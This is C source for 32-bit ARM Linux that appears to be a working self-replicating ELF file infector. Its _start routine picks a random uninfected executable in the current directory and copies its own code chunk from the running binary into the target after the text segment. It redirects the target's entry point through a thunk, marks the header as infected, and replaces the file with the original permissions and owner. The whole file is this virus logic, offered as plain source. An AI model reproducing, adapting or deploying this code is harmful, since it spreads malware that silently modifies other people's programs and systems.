#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <time.h>
#include <elf.h>
#include <linux/auxvec.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <syscall.h>
#include <limits.h>
#include "../thunk/thunk_info.h"
#include "../inc/inject_info.h"
#include "fc.h"

typedef __UINT8_TYPE__   u8;
typedef __INT8_TYPE__    i8;
typedef __UINT16_TYPE__  u16;
typedef __INT16_TYPE__   i16;
typedef __UINT32_TYPE__  u32;
typedef __INT32_TYPE__   i32;
typedef __UINT64_TYPE__  u64;
typedef __INT64_TYPE__   i64;
typedef __PTRDIFF_TYPE__ size;
typedef __SIZE_TYPE__    usize;
typedef __UINTPTR_TYPE__ uptr;
typedef __INTPTR_TYPE__  iptr;
typedef char             byte;
typedef unsigned char    bool;
enum
{
   false,
   true
};

#undef st_atime
#undef st_mtime
#undef st_ctime
struct stat64
{
    u64 st_dev;
    u32 __pad1;
    u32 st_ino;
    u32 st_mode;
    u32 st_nlink;
    u32 st_uid;	
    u32 st_gid;
    u64 st_rdev;
    u64 __pad2;
    i64 st_size;
    i32 st_blksize;
    i32 __pad3;
    i64 st_blocks;
    i32 st_atime;
    u32 st_atime_nsec;
    i32 st_mtime;
    u32 st_mtime_nsec;
    i32 st_ctime;
    u32 st_ctime_nsec;
    u32 __unused4;
    u32 __unused5;
};

#define PGSIZE  (1 << 12)
// Each time an executable is injected, this marker is inserted into the
// ELF header to prevent it from being injected a second time.
#define I_MARKER 0xDB

#define assert(c)   while (!(c)) *(volatile int *)0 = 0
#define sizeof(x)   (size) sizeof(x)
#define countof(a)  (size)(sizeof(a) / sizeof(*(a)))
#define lengthof(s) (countof(s) - 1)
#define s8(s)       (struct s8){(u8 *)s, lengthof(s)}
#define s8cstr(s)   (struct s8){(u8 *)s, strlen(s)}
#define s8nulx       (struct s8){(u8 *)"", 1}

#define SYSCALL1(n, a)                \
    syscall1(n,(long)(a))
#define SYSCALL2(n, a, b)             \
    syscall2(n,(long)(a),(long)(b))
#define SYSCALL3(n, a, b, c)          \
    syscall3(n,(long)(a),(long)(b),(long)(c))
#define SYSCALL6(n, a, b, c, d, e, f) \
    syscall6(n,(long)(a),(long)(b), (long)(c), (long)(d), (long)(e), (long)(f))

static long syscall1(long n, long a)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0)
        : "r1", "r2", "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

static long syscall2(long n, long a, long b)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1)
        : "r2", "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

static long syscall3(long n, long a, long b, long c)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1), "r"(r2)
        : "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

static long syscall6(long n, long a, long b, long c, long d, long e, long f)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
        : "r9", "r12", "memory"
    );
    return ret;
}

__attribute__((naked))
static unsigned int ret_uidivmod(unsigned int q, unsigned int r)
{
    (void) q;
    (void) r;
    __asm(
        "bx lr"
        );
}

static void uidivmod(unsigned int n, unsigned int d, unsigned int *q, 
                     unsigned int *r)
{
    *q = 0;
    *r = 0;
    if (d == 0)
    {
        return;
    }

    for (int i = 31; i >= 0; i--)
    {
        if (d <= (n >> i))
        {
            n -= (d << i);
            (*q) |= 0x1U << i;
        }
    }
    *r = n;
}

__attribute__((used))
static unsigned int __aeabi_uidiv(unsigned int n, unsigned int d)
{
    unsigned int q;
    unsigned int r;

    uidivmod(n, d, &q, &r);
    return q;
}

__attribute__((used))
static int __aeabi_idiv(int n, int d)
{
    if (n == 0 || d == 0)
    {
        return 0;
    }

    if (n == d)
    {
        return 1;
    }

    if (d == INT_MIN)
    {
        return 0;
    }

    int s = (n >> 31) ^ (d >> 31) ? -1 : 1;
    unsigned int _d = (d < 0) ? (unsigned int) -d : (unsigned int) d;
    unsigned int _n = (unsigned int) n;
    if (n < 0)
    {
        _n = (n == INT_MIN) ? (unsigned int) INT_MAX : (unsigned int) -n;
    }

    unsigned int q;
    unsigned int r;
    uidivmod(_n, _d, &q, &r);
    if (n == INT_MIN && r + 1 == _d)
    {
        q++;
    }
    return s * (int) q;
}

__attribute__((used))
static unsigned int __aeabi_uidivmod(unsigned int n, unsigned int d)
{
    unsigned int q;
    unsigned int r;

    uidivmod(n, d, &q, &r);
    return ret_uidivmod(q, r);
}

static void *memset(void *s, int c, usize n)
{
    u8 *p = s;
    while (n--) *p++ = (u8) c;
    return s;
}

static void *memcpy(void *d, const void *s, usize n)
{
    u8 *p = d;
    const u8 *q = s;
    while (n--) *p++ = *q++;
    return d;
}

struct arena
{
    u8 *beg;
    u8 *end;
    size sz;
    u8 **commit;
};

static bool new_arena(struct arena *a, size sz)
{
    if (sz <= 0)
    {
        return false;
    }
    sz += sizeof(a->commit);
    u8 *beg = (u8 *) SYSCALL6(SYS_mmap2, NULL, sz, PROT_NONE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (beg == MAP_FAILED
        || SYSCALL3(SYS_mprotect, beg, PGSIZE, PROT_READ | PROT_WRITE) == -1)
    {
        return false;
    }
    a->sz = sz;
    a->beg = beg;
    a->end = a->beg + a->sz;
    a->commit = (u8 **) a->beg;
    *a->commit = a->beg + PGSIZE;
    a->beg += sizeof(a->commit);
    return true;
}

static void free_arena(struct arena *a)
{
    if (a->beg)
    {
        SYSCALL2(SYS_munmap, a->beg, a->sz);
    }
}

#define new(a, t, n) (t *) alloc(a, sizeof(t), _Alignof(t), n)
static void *alloc(struct arena *a, size sz, size align, size count)
{
    size pad = -(iptr) a->beg & (align - 1);
    size avail = a->end - a->beg - pad;
    if (avail < 0 || count > avail / sz)
    {
        return NULL;
    }
    u8 *p = a->beg + pad;
    a->beg += pad + count * sz;
    if (a->beg >= *a->commit)
    {
        if (SYSCALL3(SYS_mprotect, *a->commit, 
                     (usize) (a->beg - *a->commit + 1),
                     PROT_READ | PROT_WRITE) == -1)
        {
            return NULL;
        }
        *a->commit = (u8 *) ((iptr) (a->beg + (PGSIZE - 1)) & ~(PGSIZE - 1));
    }
    return memset(p, 0, (usize) (count * sz));
}

struct s8
{
    u8 *data;
    size len;
};

static bool s8cpy(struct arena *a, struct s8 *dst, struct s8 src)
{
    dst->len = src.len;
    dst->data = new(a, u8, src.len);
    if (!dst->data)
    {
        return false;
    }
    memcpy(dst->data, src.data, (usize) src.len);
    return true;
}

static bool s8cat(struct arena *a, struct s8 *dst, struct s8 head,
                  struct s8 tail)
{
    *dst = head;
    if ((!head.data || head.data + head.len != a->beg)
        && !s8cpy(a, dst, head))
    {
        return false;
    }
    if (!s8cpy(a, &head, tail))
    {
        return false;
    }
    dst->len += head.len;
    return true;
}

static int s8open(struct arena a, struct s8 path, int flags)
{
    struct s8 tpath;
    struct s8 s8nul = { &(u8) {0}, 1 };
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        return -1;
    }
    return (int) SYSCALL2(SYS_open, tpath.data, flags);
}

static int s8unlink(struct arena a, struct s8 path)
{
    struct s8 tpath;
    struct s8 s8nul = { &(u8) {0}, 1 };
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        return -1;
    }
    return SYSCALL1(SYS_unlink, tpath.data);
}

static int s8rename(struct arena a, struct s8 oldpath, struct s8 newpath)
{
    struct s8 toldpath;
    struct s8 tnewpath;
    struct s8 s8nul = { &(u8) {0}, 1 };
    if (!s8cat(&a, &toldpath, oldpath, s8nul)
        || !s8cat(&a, &tnewpath, newpath, s8nul))
    {
        return -1;
    }
    return SYSCALL2(SYS_rename, toldpath.data, tnewpath.data);
}

static int s8chmod(struct arena a, struct s8 path, mode_t mode)
{
    struct s8 tpath;
    struct s8 s8nul = { &(u8) {0}, 1 };
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        return -1;
    }
    return SYSCALL2(SYS_chmod, tpath.data, mode);
}

static int s8chown(struct arena a, struct s8 path, uid_t own, gid_t grp)
{
    struct s8 tpath;
    struct s8 s8nul = { &(u8) {0}, 1 };
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        return -1;
    }
    return SYSCALL3(SYS_chown, tpath.data, own, grp);
}

static int s8stat64(struct arena a, struct s8 path, struct stat64 *sbuf)
{
    struct s8 tpath;
    struct s8 s8nul = { &(u8) {0}, 1 };
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        return -1;
    }
    return SYSCALL2(SYS_stat64, tpath.data, sbuf);
}

static size strlen(const char *s)
{
    if (!s)
    {
        return 0;
    }
    size len = 0;
    while (*s++) len++;
    return len;
}

static bool find_aux(Elf32_auxv_t *aux, unsigned int type, unsigned int *val)
{
    for (Elf32_auxv_t *a = aux; a->a_type != AT_NULL; a++)
    {
        if (a->a_type == type)
        {
            *val = a->a_un.a_val;
            return true;
        }
    }
    return false;
}

static bool find_info(struct inject_info *ii, unsigned int type, unsigned int *val)
{
    for (struct inject_info *i = ii; i->type != II_NULL; i++)
    {
        if (type == i->type)
        {
            *val = i->val;
            return true;
        }
    }
    return false;
}

struct code
{
    u8 *base;
    size len;
};

struct binary
{
    struct code exec;
    size pad1;
    struct code thunk;
    struct code chunk;
    size pad2;
};

static bool is_exec(struct arena scratch, struct s8 fname)
{
    int fd = s8open(scratch, fname, O_RDONLY);
    if (fd < 0)
    {
        return false;
    }

    bool is_exec = false;
    Elf32_Ehdr ehdr;
    if (SYSCALL3(SYS_read, fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr))
    {
        goto cleanup;
    }
    
    if (ehdr.e_ident[0] != ELFMAG0
        || ehdr.e_ident[1] != ELFMAG1
        || ehdr.e_ident[2] != ELFMAG2
        || ehdr.e_ident[3] != ELFMAG3
        || ehdr.e_type != ET_EXEC
        || ehdr.e_machine != EM_ARM
        || ehdr.e_version != EV_CURRENT)
    {
        goto cleanup;
    }
    
    if ((ehdr.e_ident[EI_NIDENT - 1] & I_MARKER) == I_MARKER)
    {
        goto cleanup;
    }
    is_exec = true;

cleanup:
    SYSCALL1(SYS_close, fd);
    return is_exec;
}


static unsigned int prand_next(unsigned int *state)
{
    *state = (1664525 * (*state) + 1013904223);
    return *state;
}

static bool get_exec_name(struct arena *perm, struct arena scratch, 
                          struct s8 *ename)
{
    int fd;
    char curd[countof(".")];
    FILL_CHARS(curd, '.', '\0');
    fd = (int) SYSCALL2(SYS_open, curd, O_RDONLY);
    if (fd < 0)
    {
        return false;
    }

    bool picked = false;
    struct timespec ts;
    if (SYSCALL2(SYS_clock_gettime, CLOCK_REALTIME, &ts) < 0)
    {
        goto cleanup;
    }
    unsigned int state = (unsigned int) (ts.tv_nsec * 1000000000 + ts.tv_sec);

    struct arena ptmp = *perm;
    char dents[1024];
    long nbytes;
    unsigned int cnt = 1;
    while ((nbytes = SYSCALL3(SYS_getdents64, fd, dents, sizeof(dents))) > 0)
    {
        long pos = 0;
        while (pos < nbytes)
        {
            struct linux_dirent64
            {
                u64 d_ino;
                i64 d_off;
                u16 d_reclen;
                unsigned char d_type;
                char d_name[];
            };
            struct linux_dirent64 *dent 
                = (struct linux_dirent64 *) (dents + pos);
            if (dent->d_type == DT_REG)
            {
                struct s8 fname = {(u8 *) dent->d_name, strlen(dent->d_name)};
                if (is_exec(scratch, fname))
                {
                    if (prand_next(&state) % cnt == 0)
                    {
                        picked = true;
                        ptmp = *perm;
                        if (!s8cpy(&ptmp, ename, fname))
                        {
                            goto cleanup;
                        }
                    }
                    cnt++;
                }
            }
            pos += dent->d_reclen;
        }
    }
    
    if (nbytes < 0)
    {
        goto cleanup;
    }
    *perm = ptmp;        
    
cleanup:
    SYSCALL1(SYS_close, fd);
    return picked;
}

static bool load_exec(struct arena scratch, struct s8 fname, struct code *exec)
{
    int fd = s8open(scratch, fname, O_RDWR);
    if (fd < 0)
    {
        return false;
    }

    bool success = false;
    struct stat64 sbuf;    
    if (SYSCALL2(SYS_fstat64, fd, &sbuf) < 0)
    {
        goto cleanup;
    }
    
    u8 *base;
    base = (u8 *) SYSCALL6(SYS_mmap2, NULL, sbuf.st_size,
                           PROT_READ | PROT_WRITE,
                           MAP_PRIVATE, fd, 0);
    if (base == MAP_FAILED)
    {
        goto cleanup;
    }
    
    exec->len = (size) sbuf.st_size;
    exec->base = base;
    success = true;

cleanup:    
    SYSCALL1(SYS_close, fd);
    return success;
}

static bool load_thunk(struct arena *perm, Elf32_auxv_t *aux, struct code *thunk)
{
    size ent;
    if (!find_aux(aux, AT_ENTRY, (unsigned int *) &ent))
    {
        return false;
    }
    thunk->len = TNK_LEN;
    thunk->base = new(perm, u8, thunk->len);
    if (!thunk->base)
    {
        return false;
    }
    
    memcpy(thunk->base, (u8 *) (ent - TNK_ENT_OFF), (usize) thunk->len);
    return true;
}

static bool load_chunk(struct arena *perm, struct arena scratch,
                       struct s8 me, struct inject_info *ii,
                       struct code *chunk) 
{
    size pos;
    if (!find_info(ii, II_CNK_POS, (unsigned int *) &pos)
        || !find_info(ii, II_CNK_LEN, (unsigned int *) &chunk->len))
    {
        return false;
    }
    chunk->base = new(perm, u8, chunk->len);
    if (!chunk->base)
    {
        return false;
    }

    int fd = s8open(scratch, me, O_RDONLY);
    if (fd < 0)
    {
        return false;
    }

    bool chunk_read = false;
    if (SYSCALL3(SYS_lseek, fd, pos, SEEK_SET) < 0)
    {
        goto cleanup;
    }
    if (SYSCALL3(SYS_read, fd, chunk->base, chunk->len) != chunk->len)
    {
        goto cleanup;
    }
    chunk_read = true;

cleanup:
    SYSCALL1(SYS_close, fd);
    return chunk_read;
}
   
static bool load(struct arena *perm, struct arena scratch, 
                 struct s8 me, struct s8 ename, Elf32_auxv_t *aux,
                 struct inject_info *ii, struct binary *bin)
{
    return load_chunk(perm, scratch, me, ii, &bin->chunk)
        && load_exec(scratch, ename, &bin->exec)
        && load_thunk(perm, aux, &bin->thunk);
}

static void unload(struct binary *bin)
{
    if (bin->exec.base)
    {
        SYSCALL2(SYS_munmap, bin->exec.base, bin->exec.len);
    }
}

static Elf32_Phdr *get_text_phdr(Elf32_Ehdr *ehdr, Elf32_Phdr *phdrs)
{
    for (i32 i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdrs[i].p_type == PT_LOAD
            && (phdrs[i].p_flags & PF_R)
            && (phdrs[i].p_flags & PF_X))
        {
            // Assumption is that the first loadable segment that's
            // read executable in the file is the text segment.
            return phdrs + i;
        }
    }
    return NULL;
}

static bool inject(struct binary *bin, size thunk_ent_off,
                   size chunk_ent_off, size *off)
{
    assert(bin->thunk.len < PGSIZE && !(bin->thunk.len& 0x3));
    
    Elf32_Ehdr *ehdr = (Elf32_Ehdr *) bin->exec.base;
    Elf32_Phdr *phdrs = (Elf32_Phdr *) (bin->exec.base + ehdr->e_phoff);
    Elf32_Shdr *shdrs = (Elf32_Shdr *) (bin->exec.base + ehdr->e_shoff);
    Elf32_Phdr *text_phdr;
    if (!(text_phdr = get_text_phdr(ehdr, phdrs)))
    {
        return false;
    }

    size ins_off = (size) (text_phdr->p_offset + text_phdr->p_filesz);
    if (ins_off < 0)
    {
        return false;
    }

    // The insertion position must be a multiple of 4, pad before the thunk
    // if necessary.
    bin->pad1 = -ins_off & 3;
    size thunk_len = bin->pad1 + bin->thunk.len;
    thunk_ent_off += bin->pad1;

    // The thunk must be small enough to fit in the padding at the end of the
    // text section,  If if's larger, it might spill over into the next
    // segment in memory if it happens to be mapped adjacent to the end
    // of the text segment.
    if (thunk_len > (-ins_off & (PGSIZE - 1)))
    {
        return false;
    }
    
    // File offsets and virtual address of each segment must be modular         
    // congruent to the page size.  The code is inserted directly after
    // the thunk so there must be adequate padding to ensure the total
    // number of bytes inserted in a multiple of page size.
    bin->pad2 = -(thunk_len + bin->chunk.len) & (PGSIZE - 1);
    size chunk_len = bin->pad2 + bin->chunk.len;

    // Update all segment and section file offsets that occur after the
    // insertion position by the total number of bytes inserted.
    size total_len = thunk_len + chunk_len;
    assert(total_len % PGSIZE == 0);
    
    for (i32 i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdrs[i].p_offset > (usize) ins_off)
        {
            phdrs[i].p_offset += (usize) total_len;
        }
    }
    for (i32 i = 1; i < ehdr->e_shnum; i++)
    {
        if (shdrs[i].sh_offset > (usize) ins_off)
        {
            shdrs[i].sh_offset += (usize) total_len;
        }
    }
    
    // Since the thunk is inserted at the end of the text segment, the size
    // of the last section header in the text segment must be increased by
    // the length of the thunk.
    for (i32 i = 1; i < ehdr->e_shnum; i++)
    {
        if (shdrs[i].sh_offset + shdrs[i].sh_size == (usize) ins_off)
        {
            // The last section must not be stripped out when loaded.
            if (shdrs[i].sh_type != SHT_PROGBITS)
            {
                return false;
            }
            shdrs[i].sh_size += (usize) thunk_len;
            break;
        }
    }
    
    // Patch the thunk so it can find and execute the chunk injected into the 
    // file.
    size chunk_off = ins_off + thunk_len;
    size tchunk_off = chunk_off & ~(PGSIZE - 1);
    size tchunk_len = chunk_off - tchunk_off + chunk_len;
    size tchunk_ent_off = chunk_off - tchunk_off + chunk_ent_off;
    // Thunk uses mmap2 which uses page multiples of offsets instead of number 
    // of bytes.
    tchunk_off /= PGSIZE;
    memcpy(bin->thunk.base + OFF_CNK_OFF, &tchunk_off, sizeof(tchunk_off));
    memcpy(bin->thunk.base + OFF_CNK_LEN, &tchunk_len, sizeof(tchunk_len));
    memcpy(bin->thunk.base + OFF_CNK_ENT_OFF, &tchunk_ent_off, 
           sizeof(tchunk_ent_off));
    // Patch the thunk so that it will call the original entry point when it
    // finishes.
    memcpy(bin->thunk.base + OFF_HOST_ENT, &ehdr->e_entry, 
           sizeof(ehdr->e_entry));
    
    // Patch the thunk so it can pass injection information into the chunk.
    size ii_tchunk_pos = ins_off + bin->pad1 + bin->thunk.len;
    memcpy(bin->thunk.base + OFF_II_CNK_POS, &ii_tchunk_pos, sizeof(ii_tchunk_pos));
    memcpy(bin->thunk.base + OFF_II_CNK_LEN, &bin->chunk.len, sizeof(bin->chunk.len));
    memcpy(bin->thunk.base + OFF_II_CNK_ENT_OFF, &chunk_ent_off, sizeof(chunk_ent_off));
    
    // Adjust the target's entry point so it will call the thunk when the
    // executable is started,
    ehdr->e_entry = text_phdr->p_vaddr + text_phdr->p_filesz
        + (usize) thunk_ent_off;
    
    // Increase the size of the text segment in the file and in memory by thunk
    // size.  
    text_phdr->p_filesz += (usize) thunk_len;
    text_phdr->p_memsz += (usize) thunk_len;
    // The section headers should always be after the insertion.
    if (ehdr->e_shoff > (usize) ins_off)
    {
        ehdr->e_shoff += (usize) total_len;
    }

    // Mark as injected so it can't be injected a second time.  A portion of
    // the magic number and other info is used, use it for this purpose.
    ehdr->e_ident[EI_NIDENT - 1] = I_MARKER;
    
    *off = ins_off;
    return true;
}

static bool output(struct arena scratch, struct s8 fname, struct binary *bin,
                   size ins_off)
{
    bool success = false;
    struct s8 tname;
    char _injected[countof(".injected")];
    FILL_CHARS(_injected, '.', 'i', 'n', 'j', 'e', 'c', 't', 'e', 'd', '\0');
    struct s8 injected = s8cstr(_injected);
    if (!s8cat(&scratch, &tname, fname, injected))
    {
        return false;
    }
    
    int fd = s8open(scratch, tname, O_WRONLY | O_TRUNC | O_CREAT);
    if (fd < 0)
    {
        goto cleanup;
    }
    
    struct stat64 sbuf;
    if (s8stat64(scratch, fname, &sbuf) < 0)
    {
        goto cleanup;
    }
    
    u8 *pad1 = new(&scratch, u8, bin->pad1);
    u8 *pad2 = new(&scratch, u8, bin->pad2);
    if (!pad1 || !pad2)
    {
        goto cleanup;
    }
    size remain_len = bin->exec.len - ins_off;
    if (SYSCALL3(SYS_write, fd, bin->exec.base, (usize) ins_off) != ins_off
        || SYSCALL3(SYS_write, fd, pad1, (usize) bin->pad1) != bin->pad1
        || SYSCALL3(SYS_write, fd, bin->thunk.base, (usize) bin->thunk.len) != bin->thunk.len
        || SYSCALL3(SYS_write, fd, bin->chunk.base, (usize) bin->chunk.len) != bin->chunk.len
        || SYSCALL3(SYS_write, fd, pad2, (usize) bin->pad2) != bin->pad2
        || SYSCALL3(SYS_write, fd, bin->exec.base + ins_off, (usize) remain_len) != remain_len)
    {
        goto cleanup;
    }
    
    if (s8chmod(scratch, tname, sbuf.st_mode) < 0
        || s8chown(scratch, tname, sbuf.st_uid, sbuf.st_gid) < 0)
    {
        goto cleanup;
    }
    if (s8rename(scratch, tname, fname) < 0)
    {
        goto cleanup;
    }
    success = true;

cleanup:
    s8unlink(scratch, tname);
    SYSCALL1(SYS_close, fd);
    return success;
}

// offset 8288
void _start(int argc, char **argv, char **env, Elf32_auxv_t *aux, struct inject_info *ii)
{
    (void) argc;
    (void) argv;
    (void) env;
    (void) aux;

    struct binary bin;
    struct arena perm;
    struct arena scratch;
    memset(&bin, 0, sizeof(bin));
    memset(&perm, 0, sizeof(scratch));
    memset(&scratch, 0, sizeof(scratch));
    if (!new_arena(&perm, 1 << 20)
        || !new_arena(&scratch, 1 << 20))
    {
        goto cleanup;
    }

    size chunk_ent_off;
    if (!find_info(ii, II_CNK_ENT_OFF, (unsigned int *) &chunk_ent_off))
    {
        goto cleanup;
    }

    if (!argv[0])
    {
        goto cleanup;
    }
    struct s8 me = s8cstr(argv[0]);
    struct s8 ename;
    size ins_off;
    if (!get_exec_name(&perm, scratch, &ename)
        || !load(&perm, scratch, me, ename, aux, ii, &bin)
        || !inject(&bin, TNK_ENT_OFF, chunk_ent_off, &ins_off)
        || !output(scratch, ename, &bin, ins_off))
        
    {
        goto cleanup;
    }

cleanup:
    unload(&bin);
    free_arena(&scratch);
    free_arena(&perm);
}
